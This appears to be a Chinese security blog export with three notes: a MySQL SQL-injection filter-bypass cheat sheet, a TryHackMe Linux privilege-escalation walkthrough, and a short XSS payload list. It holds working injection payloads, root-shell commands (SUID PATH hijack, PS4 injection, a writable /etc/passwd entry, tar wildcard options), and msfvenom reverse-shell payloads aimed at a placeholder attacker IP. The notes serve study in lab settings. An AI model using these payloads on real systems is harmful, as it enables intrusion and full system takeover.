<h3 id="0-基础饶过"><a href="#0-基础饶过" class="headerlink" title="0)基础饶过"></a>0)基础饶过</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.大小写绕过</span><br><span class="line">2.双写绕过</span><br><span class="line">3.添加注释 &#x2F;*!*&#x2F; or &#x2F;*!小于mysql版本*&#x2F;</span><br><span class="line">5.宽字节、Latin1默认编码</span><br><span class="line">Latin1编码：</span><br><span class="line">[Mysql表的编码默认为latin1，如果设置字符集为utf8，则存在一些latin1中有</span><br><span class="line">而utf8中没有的字符，而Mysql是如何处理这些字符的呢？直接忽略。</span><br><span class="line">于是我们可以输入?username&#x3D;admin%c2，存储至表中就变为了admin上面的%c2可以换为%c2-%ef之间的任意字符]</span><br></pre></td></tr></table></figure>
<h3 id="1-过滤空格"><a href="#1-过滤空格" class="headerlink" title="1)过滤空格"></a>1)过滤空格</h3><blockquote>
<p>反引号</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SQL&gt; select * from&#96;user&#96;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>括号</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SQL&gt; &#39;and(true)like(false)union(select(pass)from(users))#</span><br></pre></td></tr></table></figure>

<blockquote>
<p>/**/</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SQL&gt;select*from&#x2F;**&#x2F;users;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>and/or后面可以跟上偶数个!、~可以替代空格,可以混合使用(混合后规律又不同)，and/or前的空格可以省略</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;or- -!!!1&#x3D;1；</span><br></pre></td></tr></table></figure>

<blockquote>
<p>select Afrom B 默认from后面必须是空格再加表名，因此为了不让你使用from可能正则表达式会检测后面的空格，我们可以用科学计数法绕过，因为1e0后面可以没有空格。</p>
<p>下面逗号是两列的意思 1e0占了第二列,同样，上面的1E0可以用1.0代替。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select A,1E0fromB</span><br></pre></td></tr></table></figure>

<blockquote>
<p>\N 绕过,绕过NULL,因为\N相当于NULL</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from pass where id&#x3D;\Nunion select 1,2, greatest((substr((select username from users limit 1 offset 0),1,1)),&#39;v&#39;)in(&#39;v&#39;);</span><br></pre></td></tr></table></figure>

<p>空格还可以使用如下替代：</p>
<blockquote>
<p>在php中 \s 会匹配0x09,0x0a,0x0b,0x0c,0x0d,0x20</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">09：Horizontal Tab</span><br><span class="line">0A：New Line</span><br><span class="line">0B：Vertical Tab</span><br><span class="line">0C：New Page</span><br><span class="line">0D：Carriage Return</span><br><span class="line">A0：Non-breaking Space</span><br><span class="line">20：Space</span><br><span class="line">a0：空格</span><br><span class="line">2B：+</span><br></pre></td></tr></table></figure>

<h3 id="2-过滤单引号："><a href="#2-过滤单引号：" class="headerlink" title="2)过滤单引号："></a>2)过滤单引号：</h3><blockquote>
<p><a href="https://blog.csdn.net/qq_42181428/article/details/105061424">https://blog.csdn.net/qq_42181428/article/details/105061424</a></p>
</blockquote>
<h3 id="3-过滤注释符"><a href="#3-过滤注释符" class="headerlink" title="3)过滤注释符"></a>3)过滤注释符</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;%00  空字节     </span><br><span class="line">&#96;     反引号   </span><br><span class="line">\#     哈希值</span><br><span class="line">-- x   SQL 语法[x为任意 前面有一个空格]</span><br><span class="line">只要闭合单引号或者其他就行  and &#39;x&#39;&#x3D;&#39;x</span><br></pre></td></tr></table></figure>

<p>shch as:</p>
<p>条件苛刻 报错测试用不了 union可以的。其他没测试,盲注时需要加@。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM Users WHERE id &#x3D; &#39;&#39; UNION SELECT 1, 2, 3&#96;&#39; limit 0,1;</span><br></pre></td></tr></table></figure>

<h3 id="4-过滤逗号"><a href="#4-过滤逗号" class="headerlink" title="4)过滤逗号"></a>4)过滤逗号</h3><p>1、在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from for的方式来解决:</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;select substr(database() from 1 for 1);</span><br><span class="line">&gt;select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure>
</blockquote>
<p>2、点击我查看Join<a href="https://www.cnblogs.com/R0ser1/p/14829001.html">绕过逗号</a></p>
<p>3、使用like</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ascii(mid(user(),1,1))&#x3D;80   #等价于</span><br><span class="line">select user() like &#39;r%&#39;</span><br><span class="line">有就返回1 无返回0</span><br></pre></td></tr></table></figure>
</blockquote>
<p>4、对于limit可以使用offset来绕过：</p>
<blockquote>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="meta"># 等价于下面这条SQL语句</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news limit <span class="number">1</span> offset <span class="number">0</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>5、case when then</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select case when substring((select password from mysql.user where user&#x3D;&#39;root&#39;) from 1 for 1)&#x3D;&#39;e&#39; then sleep(5) else 0 end #</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/zz_Caleb/article/details/88933173">https://blog.csdn.net/zz_Caleb/article/details/88933173</a></p>
<h3 id="5-过滤等号"><a href="#5-过滤等号" class="headerlink" title="5)过滤等号"></a>5)过滤等号</h3><blockquote>
<p>find_in_set(mid(user(),1,1),’a,b,c,d’) 如果当前用户的第一个字符不在 ‘a,b,c…’ 字符串中，返回0；如果在字符串中，则返回那个字母的索引。如图，r 在字符串中第18个位置。</p>
</blockquote>
<p>数据库中，索引的位置返回时间。</p>
<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gr0th1g11lj30rp0ai0uh.jpg" alt="shujuku"></p>
<p>实战中要测试，最开始没有R的时候需要2S，然后加上R就是7，而R的位置是5。</p>
<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gr0tfjp3joj30y70axmzz.jpg" alt="1sel"></p>
<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gr0tfrwc97j30yw0antbi.jpg" alt="2sellp"></p>
<blockquote>
<p>mid(user(),1,1) 返回当前用户的第一个字符,如果当前用户第一个字符在集合后面，返回1，否则返回0。</p>
</blockquote>
<p>数据库中</p>
<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gr1a29k7b4j30hs08pdgd.jpg" alt="sellp"></p>
<p>ord(1)=49,ord(0)=48。所以正确就返回7s。</p>
<p><strong>实战测试中</strong></p>
<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gr1a43e5wgj61080a6q5x02.jpg" alt="test"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1)regexp操作符用于配匹正则表达式， id regexp 1 与 id &#x3D; 1 效果一样</span><br><span class="line"></span><br><span class="line">2)&lt;&gt;等价于!&#x3D; 所以在前面加一个!结果就是等号 !(id&lt;&gt;1) 与 id &#x3D; 1 效果一样</span><br><span class="line"></span><br><span class="line">3)使用大小于号来绕过，id &gt; 1 and id &lt; 3 与 id &#x3D; 1 效果一样</span><br><span class="line"></span><br><span class="line">4)不加通配符的like、rlike执行的效果和 &#x3D; 一致</span><br><span class="line"></span><br><span class="line">5)between a and b ：范围在a-b之间 id between 1 and 1 与 id &#x3D; 1 效果相同</span><br></pre></td></tr></table></figure>

<h3 id="6-过滤过滤比较符号-（-lt-和-gt-）"><a href="#6-过滤过滤比较符号-（-lt-和-gt-）" class="headerlink" title="6)过滤过滤比较符号 （ &lt; 和 &gt; ）"></a>6)过滤过滤比较符号 （ <code>&lt;</code> 和 <code>&gt;</code> ）</h3><p>使用<strong>greatest()、least（）函数</strong>绕过</p>
<blockquote>
<p>greatest()、least（）：（前者返回最大值，后者返回最小值）</p>
<p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id&#x3D;1 and ascii(substr(database(),0,1))&gt;64</span><br></pre></td></tr></table></figure>

<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值<br>那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id&#x3D;1 and greatest(ascii(substr(database(),0,1)),64)&#x3D;64</span><br></pre></td></tr></table></figure>

<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gr1au2dkhsj30nm06qt8z.jpg" alt="QQ截图20210531082158"></p>
<p>看上面的截取，第一位和第二位显示。</p>
<p><strong>使用between a and b ：范围在a-b之间</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id&#x3D;1 and (ascii(substr(database(),1,1))) between 1 and 190;</span><br></pre></td></tr></table></figure>

<p><strong>使用strcmp(str1,str2)</strong></p>
<blockquote>
<p>若所有的字符串均相同，则返回<code>STRCMP()</code>，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1</p>
</blockquote>
<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gr1cfj1sn7j30tf07dq4x.jpg" alt="QQ截图20210531091711"></p>
<h3 id="7-等价函数变量饶过"><a href="#7-等价函数变量饶过" class="headerlink" title="7)等价函数变量饶过"></a>7)等价函数变量饶过</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.hex()、bin() &#x3D;&#x3D;&gt; ascii()</span><br><span class="line"></span><br><span class="line">2.sleep() &#x3D;&#x3D;&gt;benchmark()</span><br><span class="line"></span><br><span class="line">3.concat_ws()&#x3D;&#x3D;&gt;group_concat()</span><br><span class="line"></span><br><span class="line">4.mid()、substr() &#x3D;&#x3D;&gt; substring()</span><br><span class="line"></span><br><span class="line">5.@@user &#x3D;&#x3D;&gt; user()</span><br><span class="line"></span><br><span class="line">6.@@datadir &#x3D;&#x3D;&gt; datadir()</span><br><span class="line"></span><br><span class="line">7.@@version &#x3D;&#x3D;&gt; version()</span><br><span class="line"></span><br><span class="line">8.&amp;&amp;&#x3D;&#x3D;&gt;and</span><br><span class="line"></span><br><span class="line">9.||&#x3D;&#x3D;&gt;or</span><br><span class="line"></span><br><span class="line">10.|&#x3D;&#x3D;&gt;xor</span><br></pre></td></tr></table></figure>

<h3 id="8-异或注入"><a href="#8-异或注入" class="headerlink" title="8)异或注入"></a>8)异或注入</h3><blockquote>
<p>在and,or ,|,&amp;&amp;,||等符号被过滤的情况下，可以采用异或注入达到注入的目的。</p>
</blockquote>
<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gr1ft5dvypj30z506omxd.jpg" alt="QQ截图20210531111402"></p>
<p>1^1=0    1^0=0 其他的自己测。数据库select 1^0;就可以</p>
<h3 id="9-information-schema被过滤"><a href="#9-information-schema被过滤" class="headerlink" title="9)information_schema被过滤"></a>9)<strong>information_schema被过滤</strong></h3><blockquote>
<p>innodb引擎可用mysql.innodb_table_stats、innodb_index_stats，日志将会把表、键的信息记录到这两个表中除此之外，系统表sys.schema_table_statistics_with_buffer、sys.schema_auto_increment_columns用于记录查询的缓存，某些情况下可代替information_schema</p>
<p>JOin也是可以的。</p>
</blockquote>
<p>推荐：<a href="https://xz.aliyun.com/t/7169#toc-20">https://xz.aliyun.com/t/7169#toc-20</a></p>
<p><a href="https://mp.weixin.qq.com/s/vdUoQU2WS7zf0EKHFYKNvg">https://mp.weixin.qq.com/s/vdUoQU2WS7zf0EKHFYKNvg</a></p>
<p>骚姿势:<a href="https://xz.aliyun.com/t/5505">https://xz.aliyun.com/t/5505</a></p>
]]></content>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Tryhackme记录liunx提权</title>
    <url>/2021/07/17/Tryhackme%E8%AE%B0%E5%BD%95liunx%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<center>Tryhackme学习liunx提权</center>

<blockquote>
<p>LinEnum 是一个简单的 bash 脚本，它执行与权限提升相关的常见命令，从而节省时间并允许投入更多精力来获取 root 权限<br><a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh</a></p>
</blockquote>
<h1 id="一、滥用SUIID-GUID文件"><a href="#一、滥用SUIID-GUID文件" class="headerlink" title="一、滥用SUIID/GUID文件"></a>一、滥用SUIID/GUID文件</h1><p>查找和利用 SUID 文件</p>
<blockquote>
<p>Linux 提权利用的第一步是检查设置了 SUID/GUID 位的文件。这意味着可以使用文件所有者/组的权限运行一个或多个文件。在这种情况下，作为超级用户。我们可以利用它来获得具有这些权限的 shell！</p>
</blockquote>
<p> 什么是 SUID 二进制文件？</p>
<blockquote>
<p>在Linux 中，一切都是一个文件，包括具有允许或限制三种操作（即读/写/执行）权限的目录和设备。因此，当您为任何文件设置权限时，您应该了解您允许或限制所有三个权限的 Linux 用户。RWX=读写执行。每个用户可以设置权限的最大位数是7位，是读（4）写（2）和执行（1）操作的组合。例如，如果您使用**”chmod”** <strong>755</strong>设置权限</p>
<p>但是当给每个用户特殊权限时，它就变成了 SUID 或 SGID</p>
<p>SUID:rws-rwx-rwx     GUID:rwx-rws-rwx</p>
</blockquote>
<p> 查找 SUID 二进制文件</p>
<blockquote>
<p>由于我们的 LinEnum 扫描，我们已经知道系统上有支持 SUID 的文件。但是，如果我们想手动执行此操作，我们可以使用以下命令：</p>
<p>find / -perm -u=s -type f 2&gt;/dev/null</p>
<p>find / -type f -a ( -perm -u+s -o -perm -g+s ) -exec ls -l {} ; 2&gt; /dev/null</p>
</blockquote>
<h2 id="SUID-SGID-可执行文件-已知的漏洞"><a href="#SUID-SGID-可执行文件-已知的漏洞" class="headerlink" title="SUID/SGID 可执行文件-已知的漏洞"></a>SUID/SGID 可执行文件-已知的漏洞</h2><p>例如查找到/usr/sbin/exim-4.84-3  然后既可以搜索他的历史漏洞运行exp进行提权</p>
<h2 id="SUID-SGID-可执行文件-环境变量1"><a href="#SUID-SGID-可执行文件-环境变量1" class="headerlink" title="SUID/SGID 可执行文件-环境变量1"></a>SUID/SGID 可执行文件-环境变量1</h2><p>我们查看找到的程序</p>
<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsi57lokfdj30jv0703zx.jpg" alt="image-20210628171343194"></p>
<p>打印出来发现执行了service apache2 start</p>
<p>【首先去环境变量找service】那我们就可以利用环境变量来提权，我们准备一个service.c 内容如下 编译一下</p>
<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsi57rl6f8j30j702qjsa.jpg" alt="image-20210628171519240"></p>
<p>将当前目录（或新服务可执行文件所在的位置）添加到 PATH 变量中，然后运行 <strong>suid-env</strong> 可执行文件以获得 root shell：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PATH&#x3D;.:$PATH &#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-env</span><br></pre></td></tr></table></figure>

<h2 id="SUID-SGID-可执行文件-环境变量2"><a href="#SUID-SGID-可执行文件-环境变量2" class="headerlink" title="SUID/SGID 可执行文件-环境变量2"></a>SUID/SGID 可执行文件-环境变量2</h2><p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsi57xfq14j30s509sgp6.jpg" alt="image-20210628190604629"></p>
<p>如图他是通过服务可执行的路径来启动apache2服务的</p>
<p>然而在 Bash 版本 <strong>&lt;4.2-048 中</strong>，可以使用类似于文件路径的名称定义 shell 函数，然后导出这些函数，以便使用它们而不是该文件路径上的任何实际可执行文件。</p>
<p>创建一个名为“ <strong>/usr/sbin/service</strong> ”的 Bash 函数，该函数执行一个新的 Bash shell（使用 -p 以便保留权限）并导出该函数：[导出函数相当于直接使用这个函数了]</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">function /usr/sbin/service &#123; /bin/bash -p; &#125;</span><br><span class="line">export -f /usr/sbin/service</span><br></pre></td></tr></table></figure>

<p>运行<strong>suid-env2</strong>可执行文件以获得 root shell：</p>
<h2 id="SUID-SGID-可执行文件-环境变量3"><a href="#SUID-SGID-可执行文件-环境变量3" class="headerlink" title="SUID/SGID 可执行文件-环境变量3"></a>SUID/SGID 可执行文件-环境变量3</h2><p>注意：这不适用于 Bash 4.4 及更高版本。</p>
<p>在调试模式下，Bash 使用环境变量<strong>PS4</strong>来显示调试语句的额外提示。</p>
<p>运行/usr/local/bin/suid-env2 </p>
<p>环境同上</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">env -i SHELLOPTS=xtrace PS4=&#x27;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)&#x27; /usr/local/bin/suid-env2</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gsi5845iz6j30xu0kf7fi.jpg" alt="image-20210628221405558"></p>
<p>使用 -p 运行 /tmp/rootbash 可执行文件以获得以 root 权限运行的 shell：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/tmp/rootbash -p</span><br></pre></td></tr></table></figure>

<h1 id="二、利用可写的-etc-passwd"><a href="#二、利用可写的-etc-passwd" class="headerlink" title="二、利用可写的/etc/passwd"></a>二、利用可写的/etc/passwd</h1><p>生成密码哈希</p>
<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsi589k878j30i503dq4e.jpg" alt="image-20210626150513572"></p>
<p>利用新创建的用户和root账户组合</p>
<blockquote>
<p>new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash</p>
</blockquote>
<h1 id="三、利用Crontab"><a href="#三、利用Crontab" class="headerlink" title="三、利用Crontab"></a>三、利用Crontab</h1><p>什么是Crontab</p>
<blockquote>
<p>Cron 守护进程是一个长时间运行的进程，它在特定的日期和时间执行命令。您可以使用它来安排活动，作为一次性事件或重复性任务。您可以创建一个 crontab 文件，其中包含 Cron 守护程序要执行的命令和指令。</p>
<p>我们可以使用命令<strong>“cat /etc/crontab”</strong>来查看调度了哪些cron作业。只要有机会，您就应该始终手动检查这一点，尤其是在 LinEnum 或类似脚本未找到任何内容的情况下。</p>
</blockquote>
<p>我们如何利用这一点？</p>
<h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><blockquote>
<p>如果一个计划归root所有，意味他将以root权限运行，我们如果可以写入此文件，然后创建一个命令。该命令返回一个shell即可以root身份运行。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R</span><br></pre></td></tr></table></figure>

<p>有效负载替换</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo [MSFVENOM OUTPUT] &gt; autoscript.sh</span><br></pre></td></tr></table></figure>

<h2 id="PATH环境变量"><a href="#PATH环境变量" class="headerlink" title="PATH环境变量"></a>PATH环境变量</h2><p>查看系统范围crontab的内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>

<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gsi58ekuyoj30uo0bqtii.jpg" alt="image-20210628111953444"></p>
<p>那我们就可以在/home/user创建一个名为overwrite.sh</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span> </span><br><span class="line"></span><br><span class="line">cp /bin/bash /tmp/rootbash </span><br><span class="line">chmod +xs /tmp/rootbash</span><br></pre></td></tr></table></figure>

<p>确保文件可以执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod +x /home/user/overwrite.sh</span><br></pre></td></tr></table></figure>

<p>等待 cron 作业运行（不应超过一分钟）。 使用 -p 运行 /tmp/rootbash 命令以获得以 root 权限运行的 shell：<code>/tmp/rootbash -p</code></p>
<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gsi58tkarrj60wh02imyo02.jpg" alt="image-20210628112440132"></p>
<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><p>我们查看其他的脚本</p>
<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gsi594z7omj30jp032js9.jpg" alt="image-20210628115009371"></p>
<p>发现tar *   查看<a href="https://gtfobins.github.io/gtfobins/tar/">https://gtfobins.github.io/gtfobins/tar/</a></p>
<p>tar 具有命令行选项可让您将其他命令作为检查点功能的一部分运行。</p>
<p>在 Kali 机器上使用 msfvenom 生成反向 shell ELF 二进制文件。相应地更新 LHOST IP 地址：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=port -f elf -o shell.elf</span><br></pre></td></tr></table></figure>

<p>将shell穿到/home/user下确保文件是可执行的：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod +x /home/user/shell.elf</span><br></pre></td></tr></table></figure>

<p>在/home/user下创建这两个文件夹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">touch /home/user/--checkpoint=1</span><br><span class="line">touch /home/user/--checkpoint-action=exec=shell.elf</span><br></pre></td></tr></table></figure>

<p>当 cron 作业中的 tar 命令运行时，通配符 (*) 将扩展以包含这些文件。由于它们的文件名是有效的 tar 命令行选项，tar 将识别它们并将它们视为命令行选项而不是文件名。</p>
<p>在你的机器开启监听即可获取shell</p>
<h1 id="四、利用PATH变量"><a href="#四、利用PATH变量" class="headerlink" title="四、利用PATH变量"></a>四、利用PATH变量</h1><p>创建一个脚本</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setuid(geteuid());</span><br><span class="line">	system(<span class="string">&quot;ps&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并给他S权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc 1.c -o shell </span><br><span class="line">chmod u+s shell  </span><br><span class="line">ls -alh shell //查看权限</span><br></pre></td></tr></table></figure>

<p>然后在其他用户上切换到/tmp[权限较大]</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; ps</span><br><span class="line">chmod +x ps</span><br></pre></td></tr></table></figure>

<p>添加变量</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure>

<p>变量都是从左到右执行的，所有/tmp在前面了</p>
<p>回到shell文件所在目录直接执行就可以提权成root权限了</p>
<p>漏洞完成之后你可以退出root使用。将 PATH 变量重置为默认值</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export PATH=删除/tmp:$PATH 之后的内容</span><br></pre></td></tr></table></figure>

<h1 id="五、SHELL转义序列"><a href="#五、SHELL转义序列" class="headerlink" title="五、SHELL转义序列"></a>五、SHELL转义序列</h1><p>列出sudo允许你的用户运行的程序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p>访问 GTFOBins ( <a href="https://gtfobins.github.io/">https://gtfobins.github.io</a> ) 并搜索一些程序名称。如果程序以“sudo”作为函数列出，您可以使用它来提升权限，通常是通过转义序列。</p>
<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsi59bpbm3j30id09478d.jpg" alt="image-20210628094653450"></p>
<h1 id="六、密码和秘钥"><a href="#六、密码和秘钥" class="headerlink" title="六、密码和秘钥"></a>六、密码和秘钥</h1><h2 id="历史文件"><a href="#历史文件" class="headerlink" title="历史文件"></a>历史文件</h2><p>如果用户不小心在命令行而不是在密码提示中输入了他们的密码，它可能会被记录在历史文件中。</p>
<p>查看用户主目录中所有隐藏历史文件的内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat ~/.*history</span><br></pre></td></tr></table></figure>

<blockquote>
<p>请注意，用户在某个时候尝试使用“root”用户名和通过命令行提交的密码连接到 MySQL 服务器。注意 -p 选项和密码之间没有空格！</p>
</blockquote>
<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>查看一些配置文件，可能发现一些有用的</p>
<h2 id="SSH密钥"><a href="#SSH密钥" class="headerlink" title="SSH密钥"></a>SSH密钥</h2><p>有时用户会备份重要文件，但无法使用正确的权限保护它们。</p>
<p>在系统根目录中查找隐藏文件和目录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -la &#x2F;</span><br></pre></td></tr></table></figure>

<p>可能会发现**.ssh**。查看目录内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -l &#x2F;.ssh</span><br></pre></td></tr></table></figure>

<h1 id="七、NFS"><a href="#七、NFS" class="headerlink" title="七、NFS"></a>七、NFS</h1><p>通过 NFS 创建的文件继承远程</p>
<p>检查 Debian VM 上的 NFS 共享配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;exports</span><br></pre></td></tr></table></figure>

<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsi59hrhhxj30jk06w0vy.jpg" alt="image-20210628215208164"></p>
<p>在我们的kali下，以root方式运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>

<p>使用 Kali 的 root 用户，在 Kali 机器上创建一个挂载点并挂载**/tmp** ：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir /tmp/nfs</span><br><span class="line">mount -o rw,vers=2 IP:/tmp /tmp/nfs</span><br></pre></td></tr></table></figure>

<p>仍然使用 Kali 的 root 用户，使用<strong>msfvenom</strong>生成负载</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o /tmp/nfs/shell.elf</span><br></pre></td></tr></table></figure>

<p>使用 Kali 的 root 用户，使文件可执行并设置 SUID 权限：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod +xs /tmp/nfs/shell.elf</span><br></pre></td></tr></table></figure>

<p>以低权限用户帐户执行该文件以获得 root shell：</p>
<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsi59mtncaj30t502hjss.jpg" alt="image-20210628215451101"></p>
<p>未完，后续补充……..</p>
]]></content>
  </entry>
  <entry>
    <title>XSS一些记录</title>
    <url>/2021/05/17/XSS%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h3 id="XSS一些总结"><a href="#XSS一些总结" class="headerlink" title="XSS一些总结"></a>XSS一些总结</h3><p>除了script以外大多标签自动加载触发JS代码大多用的都是on事件，以下标签都可以用下面的方法去打Cookie以及url等</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">常见标签</span><br><span class="line">&lt;img&gt;&lt;input&gt;&lt;details&gt;&lt;svg&gt;&lt;select&gt;&lt;iframe&gt;</span><br><span class="line">&lt;video&gt;&lt;audio&gt;&lt;textarea&gt;  &lt;body&gt;&lt;Style&gt;&lt;Media&gt;</span><br><span class="line">such <span class="keyword">as</span>: 其他的标签自动触发百度一下就好了</span><br><span class="line">&lt;body onpageshow=alert(<span class="number">1</span>)&gt;</span><br><span class="line"></span><br><span class="line">Media 标签是利用音视频标签来加载XSS Payload</span><br><span class="line">测试了一下自动触发事件的标签</span><br><span class="line">onloadstart: 在浏览器开始寻找指定音视频（audio/video）时触发；</span><br><span class="line"></span><br><span class="line">&lt;audio onloadstart=alert(<span class="number">1</span>) src=<span class="string">&quot;x.mp3&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">反射内容</span><br><span class="line">-alert(<span class="number">1</span>)-  -prompt(<span class="number">1</span>)- -confirm(<span class="number">1</span>)-</span><br><span class="line"></span><br><span class="line">javascript伪协议</span><br><span class="line">&lt;iframe src=javascript:alert(<span class="string">&#x27;xss&#x27;</span>);&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">利用link远程包含js文件</span><br><span class="line">PS：在无CSP的情况下才可以</span><br><span class="line">&lt;link rel=<span class="keyword">import</span> href=<span class="string">&quot;http://127.0.0.1/1.js&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

